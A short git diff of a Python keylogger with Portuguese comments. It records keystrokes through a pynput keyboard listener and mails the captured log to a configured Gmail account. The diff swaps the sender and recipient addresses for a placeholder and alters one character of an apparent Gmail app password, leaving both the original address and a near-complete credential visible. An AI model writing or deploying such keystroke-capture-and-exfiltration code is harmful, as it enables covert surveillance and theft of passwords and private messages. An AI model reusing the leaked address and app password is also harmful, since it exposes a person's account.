@@ -8,9 +8,9 @@ from threading import Timer
 log = ""
 
 #CONFIGURAÇÕES DE E-MAIL
-EMAIL_ORIGEM = "yzeerts@gmail.com"
-EMAIL_DESTINO = "yzeerts@gmail.com"
-SENHA_EMAIL = "beht heua vowx cwpc"
+EMAIL_ORIGEM = "testmail@gmail.com"
+EMAIL_DESTINO = "testmail@gmail.com"
+SENHA_EMAIL = "beht heua vowx cwpx"
 
 def enviar_email():
     global log
@@ -52,6 +52,7 @@ def on_press(key):
 with keyboard.Listener(on_press=on_press) as listener:
     enviar_email()
     listener.join()
+
 
 
 
